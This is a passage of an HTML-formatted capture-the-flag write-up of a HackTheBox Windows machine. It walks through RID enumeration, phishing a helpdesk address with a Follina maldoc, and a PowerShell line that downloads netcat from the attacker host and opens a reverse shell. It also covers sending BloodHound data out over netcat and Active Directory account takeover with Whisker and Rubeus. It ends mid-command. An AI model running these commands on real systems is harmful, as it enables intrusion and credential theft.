font-style: inherit;">1200</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">do</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rpcclient</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--command</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lookupsids S-1-5-21-4089647348-67660539-4016542185-</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$i</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span> 10.10.11.175 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-U</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--password</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">done</span></span>
<span id="cb6-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb6-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1103</span> OUTDATED<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>nsAdmins <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1104</span> OUTDATED<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>nsUpdateProxy <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1105</span> OUTDATED<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\C</span>LIENT$ <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1106</span> OUTDATED<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\b</span>tables <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1107</span> OUTDATED<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\I</span>TStaff <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1108</span> OUTDATED<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>flowers <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S-1-5-21-4089647348-67660539-4016542185-1109</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>unknown<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\*</span>unknown<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>We find two users - <code>btables</code> &amp; <code>sflowers</code></p>
<p><strong>Asreproast</strong> fails:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated impacket-GetNPUsers outdated.htb/ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-usersfile</span> /htb/outdated/users.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-format</span> hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.10.11.175</span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> User administrator doesn<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'t have UF_DONT_REQUIRE_PREAUTH set</span></span>
<span id="cb7-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[-] User btables doesn'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> User sflowers doesn<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'t have UF_DONT_REQUIRE_PREAUTH set</span></span></code></pre></div>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>The initial vectors on this machine are slim and I can’t see any other way in then utilizing SMTP, especially since CVE-2022-30190 (Follina) is listed in the PDF, so I decide to reboot the box - but to no avail. At this point I needed a sanity check so I went to the HackTheBox discord to confirm my suspicions, and sure enough SMTP is the vector for foothold.</p>
<p>I waited for a day before continuing, and heard that the box should be fixed and more stable.</p>
<p>Instead of logging in to the remote SMTP server over telnet, or using my own local SMTP server, we can try a third option - <code>swaks</code>.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated swaks <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--to</span> itsupport@outdated.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--from</span> 0xpthree@exploit.se <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--server</span> mail.outdated.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--body</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://10.10.14.6/pwn.html"</span></span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">===</span> Trying mail.outdated.htb:25...</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">===</span> Connected to mail.outdated.htb.</span>
<span id="cb8-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">220</span> mail.outdated.htb ESMTP</span>
<span id="cb8-5"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> EHLO void</span>
<span id="cb8-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-mail.outdated.htb</span></span>
<span id="cb8-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-SIZE</span> 20480000</span>
<span id="cb8-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-AUTH</span> LOGIN</span>
<span id="cb8-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> HELP</span>
<span id="cb8-10"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> MAIL FROM:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>0xpthree@exploit.se<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb8-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> OK</span>
<span id="cb8-12"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> RCPT TO:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>itsupport@outdated.htb<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb8-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> OK</span>
<span id="cb8-14"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> DATA</span>
<span id="cb8-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">354</span> OK, send.</span>
<span id="cb8-16"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Date: Mon, 15 Aug 2022 15:14:51 +0200</span>
<span id="cb8-17"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> To: itsupport@outdated.htb</span>
<span id="cb8-18"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> From: 0xpthree@exploit.se</span>
<span id="cb8-19"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Subject: test Mon, 15 Aug 2022 15:14:51 +0200</span>
<span id="cb8-20"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Message-Id: <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>20220815151451.031141@void<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb8-21"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/</span>
<span id="cb8-22"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb8-23"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> http://10.10.14.6/pwn.html</span>
<span id="cb8-24"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb8-25"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb8-26"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> .</span>
<span id="cb8-27"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> Queued <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.406</span> seconds<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb8-28"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> QUIT</span>
<span id="cb8-29"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>-  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">221</span> goodbye</span></code></pre></div>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80                                                                                                         </span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://0.0.0.0:80/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.175</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [16/Aug/2022 09:05:43] code 404, message File not found</span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.175</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [16/Aug/2022 09:05:43] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /pwn HTTP/1.1"</span> 404 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>The machine is indeed fixed and now we get callbacks! However I had huge problems to get this next part to fly.</p>
<p>We want to utilize the CVE-2022-30190 (MSDT Follina) to download malicious scripts via en embeded link. To do this we use <a href="https://github.com/JohnHammond/msdt-follina">John Hammonds</a> script which will create a malicious <code>.doc</code> file, host a webserver with needed html payload, and will start a netcat listener for you.</p>
<p>The payload will try to download <code>nc64.exe</code> and upload it to the victim, which will then be used to create a reverse shell. The code for this points towards John Hammonds Github, so since this is HackTheBox we need to change that to point to our local attacking machine.</p>
<p>This is row 111 in <code>follina.py</code> after editing:</p>
<pre><code>command = f"""Invoke-WebRequest http://10.10.14.2:8888/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""</code></pre>
<p>We can now execute <code>follina.py</code> and on the first row we’ll find the staging directory - it looks something like this <code>[+] copied staging doc /tmp/67gup9zc</code>.</p>
<p><strong>Copy nc64.exe</strong> to <code>/tmp/67gup9zc/www</code> and now you’re ready to send your email.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  msdt-follina ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> /tmp/67gup9zc/www</span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 64</span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 void void  4096 Aug 19 13:04 .</span>
<span id="cb11-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 void void  4096 Aug 19 12:54 ..</span>
<span id="cb11-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void  4689 Aug 19 12:54 index.html</span>
<span id="cb11-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span> 1 void void 45272 Aug 19 13:04 nc64.exe</span>
<span id="cb11-7"></span>
<span id="cb11-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  msdt-follina sendEmail <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> itsupport@outdated.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> 0xpthree@exploit.se <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> mail.outdated.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> PleaseWork <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'http://10.10.14.2/'</span></span>
<span id="cb11-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aug</span> 19 12:54:31 void sendEmail<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">17349</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>: Email was sent successfully!</span>
<span id="cb11-10"></span>
<span id="cb11-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  msdt-follina python3 follina.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> tun0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 80 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> 4444     </span>
<span id="cb11-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> copied staging doc /tmp/67gup9zc</span>
<span id="cb11-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> created maldoc ./follina.doc</span>
<span id="cb11-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> serving html payload on :80</span>
<span id="cb11-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> starting <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'nc -lvnp 4444'</span> </span>
<span id="cb11-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4444 ...</span>
<span id="cb11-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.2</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.175]</span> 49822</span>
<span id="cb11-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Microsoft</span> Windows [Version 10.0.19043.928]</span>
<span id="cb11-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Microsoft</span> Corporation. All rights reserved.</span>
<span id="cb11-20"></span>
<span id="cb11-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Users\btables\AppData\Local\Temp\SDIAG_9fb3a047-99c4-4779-8d48-a154f6f5936e</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>whoami</span>
<span id="cb11-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">outdated\btables</span></span></code></pre></div>
<p><strong>NOTE:</strong> For me to figure this out I downloaded and setup a python3 http redirect to log and see what happened behind the scenes, this could also have been done using Wireshark or anything similar.</p>
<pre><code>➜  msdt-follina python3 redirect.py 80 http://10.10.14.2:8888
10.10.11.175 - - [19/Aug/2022 12:18:18] "GET / HTTP/1.1" 301 -
10.10.11.175 - - [19/Aug/2022 12:18:20] "GET /nc64.exe HTTP/1.1" 301 -</code></pre>
<p>With this information we can see that the script worked, but the payload delivery (of nc64.exe) didn’t.</p>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Quickly look through the box as user <code>btables</code> and we see that <code>user.txt</code> is not here, maybe we need to move laterally to <code>sflowers</code> that we found earlier.</p>
<p>Upload <code>SharpHound.exe</code> to the target and start enumerating with BloodHound.</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>curl http://10.10.14.2:8888/SharpHound.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\W</span>indows<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>asks<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\S</span>harpHound.exe</span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>dir</span>
<span id="cb13-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">08/19/2022</span>  11:17 AM    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>DIR<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>          .</span>
<span id="cb13-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">08/19/2022</span>  11:17 AM    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>DIR<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>          ..</span>
<span id="cb13-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">08/19/2022</span>  11:17 AM           908,288 SharpHound.exe</span>
<span id="cb13-6"></span>
<span id="cb13-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Start listener to receive</span></span>
<span id="cb13-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lp</span> 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> SharpOut.zip</span>
<span id="cb13-9"></span>
<span id="cb13-10"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Send data</span></span>
<span id="cb13-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>nc.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.2 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> 20220819112306_SharpOut.zip</span></code></pre></div>
<p>In BloodHound, mark user <code>btables</code> as Owned and search for <code>Administrator</code>. Press <code>Shortest Path to Here from Owned</code> and we see a nice path:</p>
<p><img src="https://exploit.se/posts/2022-08-22-htb-writeup-outdated/images/outdated02.png" class="img-fluid"></p>
<p>Searching for <code>AddKeyCredentialLink</code>, we find <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials</a> and the tool <a href="https://github.com/eladshamir/Whisker">Whisker.exe</a> for exploitation. This technique allows an attacker to take over an AD user or computer account if the attacker can modify the target object’s (user or computer account) attribute <code>msDS-KeyCredentialLink</code> and append it with alternate credentials in the form of certificates.</p>
<p>Add the shadow credentials (modify the <code>msDS-KeyCredentialLink</code> attribute) to the vulnerable AD user <code>sflowers</code> using <a href="https://github.com/eladshamir/Whisker">Whisker.exe</a>.</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>curl http://10.10.14.2:8888/Whisker.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\W</span>indows<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>asks<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\W</span>hisker.exe</span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Whisker.exe add /target:sflowers</span>
<span id="cb14-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> No path was provided. The certificate will be printed as a Base64 blob</span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> No pass was provided. The certificate will be stored with the password qUOOiC6IHD1YbErH</span>
<span id="cb14-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Searching for the target account</span>
<span id="cb14-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb</span>
<span id="cb14-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Generating certificate</span>
<span id="cb14-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Certificate generaged</span>
<span id="cb14-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Generating KeyCredential</span>
<span id="cb14-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> KeyCredential generated with DeviceID 1b1d7ce3-46ae-4631-9ace-8e962ccdc9ba</span>
<span id="cb14-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Updating the msDS-KeyCredentialLink attribute of the target object</span>
<span id="cb14-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Updated the msDS-KeyCredentialLink attribute of the target object</span>
<span id="cb14-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> You can now run Rubeus with the following syntax:</span>
<span id="cb14-14"></span>
<span id="cb14-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Rubeus.exe</span> asktgt /user:sflowers /certificate:MIIJsA...qoCAgfQ /password:<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"qUOOiC6IHD1YbErH"</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span></code></pre></div>
<p>The shadow credential has been added to the account and we are returned a long <code>Rubeus.exe</code> string, so lets upload <code>Rubeus.exe</code> and execute the command:</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>curl http://10.10.14.2:8888/Rubeus.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\W</span>indows<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>asks<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\R</span>ubeus.exe</span>
<span id="cb15-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C:\Windows\Tasks</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Rubeus.exe asktgt /user:sflowers /certificate:MIIJsA...qoCAgfQ /password:<span class="st" style="color: #20794D;
background-color: null;
